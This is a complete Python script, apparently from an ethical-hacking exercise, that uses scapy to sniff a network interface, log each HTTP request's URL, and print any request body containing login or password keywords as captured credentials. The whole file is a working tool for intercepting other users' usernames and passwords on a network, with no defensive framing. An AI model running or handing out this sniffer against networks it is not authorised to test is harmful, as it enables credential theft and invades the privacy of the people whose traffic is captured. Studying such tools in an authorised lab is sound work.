#!/usr/bin/env python
import scapy.all as scapy
import argparse
import time
from scapy.layers import http


def main():
    #get user arguments
    interface = get_arguments()
    check_args(interface)

    try:
        sniff(interface)
    except:
        print('[+] Halting sniff process. Exiting...')


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f'[+] HTTP Request >> {url}')

        loginInfo = get_login_info(packet)
        if loginInfo:
            print(f'\n\n[+] Possible Username/Password found > {loginInfo} \n\n')


def get_url(packet):
    return f'{packet[http.HTTPRequest].Host}{packet[http.HTTPRequest].Path}'


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
        keywords = ['username', 'uname', 'login', 'user', 'password', 'pass']
        for word in keywords:
            if word in load:
                return load

    
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', dest='interface', help="Defines which interface you want to sniff (most commonly eth0).")
    options = parser.parse_args()

    return options.interface


def check_args(interface):
    if interface == None:
        print('Please input an interface to sniff using the "-i" command.\n(Use --help for help)')
        exit()


if __name__ == '__main__':
    main()